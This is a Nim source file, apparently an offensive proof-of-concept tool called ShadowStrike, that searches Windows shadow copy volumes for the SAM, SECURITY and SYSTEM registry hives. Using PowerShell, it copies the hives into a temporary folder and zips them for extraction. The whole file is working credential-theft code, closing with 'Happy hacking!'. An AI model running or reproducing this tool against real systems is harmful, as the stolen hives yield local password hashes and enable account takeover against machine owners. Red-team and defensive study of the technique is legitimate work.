#[
    ShadowStrike | Nim Implementation
    Author: HuskyHacks

    POC: enumerates host drives for shadow volumes of SAM, SYSTEM, and SECURITY hive keys.
    First build: naive implementation, no OPSEC considerations

]#

import os
import osproc
import winim
import strutils
import times
import zippy/ziparchives
import random

let time = cast[string](format(now(), "yyyyMMddhhmm"))

proc shadowSteal(): void =
    echo "[*] Executing ShadowSteal..."
    echo "[*] Time: ", time
    echo "[*] Searching for shadow volumes on this host..."
    for i in 1 .. 10:
        # String builder
        var cmdString: string = "[System.IO.File]::Exists('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" & $i & "\\Windows\\System32\\config\\SAM\')"
        let cmd = "powershell.exe -c \"" & cmdString & "\""
        echo "[*] Checking for HarddiskVolumeShadowCopy" & $i
        let result = (execProcess(cmd))
        if "True" in result:
            echo "[+] Hit!"
            echo "[+] HarddiskVolumeShare" & $i & " identified."
            var keys = @["SAM", "SECURITY", "SYSTEM"]
            echo "[+] Exfiltrating the contents of the config directory..."
            let dir = "tmp"
            if not dirExists(dir):
                createDir(dir)
            for key in keys:
                let stealName = time & "_" & key
                let exfilSAMString = "[System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" & $i & "\\Windows\\System32\\config\\" & key & "\', '" & dir & "\\" & stealName & "')"
                let exfilPScmd = "powershell.exe -c \"" & exfilSAMString & "\""
                let exfilCmd = (execProcess(exfilPScmd))
            echo "[+] Hives extracted!"
            echo "[*] Compressing... "
            var compressName = time & "_" & "ShadowSteal.zip"
            createZipArchive(dir, compressName)
            removeDir(dir)
            
            echo "[+] SAM, SECURITY, and SYSTEM Hives have been extracted to " & cast[string](compressName) & "."
            write(stdout, "[?] Would you like to continue? -> [y/N]")
            var answer = readLine(stdin)
            let yes = @["yes", "y", "YES", "Y"] 
            if not (answer in yes):
                break
            else:
                continue
        else:
            var nopes = ["Nope", "Nah fam", "Nein", "Negaive", "No", "Not there", "No way", "No :("]
            let nope = sample(nopes)
            echo "[-] " & nope

    echo "[*] Done! Happy hacking!"

when defined(windows):
    if defined(i386):
        echo "[-] Not designed for a 32 bit processor. Exiting..."
        quit()
    else:
        when isMainModule:
            shadowSteal()
